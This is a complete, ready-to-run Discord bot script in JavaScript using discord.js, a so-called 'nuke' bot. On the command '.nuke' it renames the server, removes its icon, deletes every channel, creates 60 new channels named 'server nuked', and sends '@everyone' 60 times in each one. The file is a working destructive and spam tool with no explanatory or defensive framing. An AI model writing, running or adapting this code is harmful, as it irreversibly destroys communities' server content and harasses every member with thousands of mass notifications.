const { Client, GatewayIntentBits } = require("discord.js");

const command = ".nuke";
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ],
});

client.once("ready", () => {
    console.log(`bot logged in as ${client.user.tag}`);
});

client.on("messageCreate", async (message) => {
    if (!message.guild || message.author.bot) return;
    if (message.content !== command) return;
    await message.reply('starting to nuke...');

    try {
        await message.guild.setName("SERVER NUKED");
        await message.guild.setIcon(null);

        await Promise.all(message.guild.channels.cache.map(channel => channel.delete()));

        const newChannels = await Promise.all(
            Array.from({ length: 60 }, () => message.guild.channels.create({ name: "server nuked", type: 0 }))
        );

        newChannels.forEach(channel => {
            for (let i = 0; i < 60; i++) {
                channel.send("@everyone").catch(console.error);
            }
        });

    } catch (error) {
        console.error(error);
    }
});

client.login("Bot token");
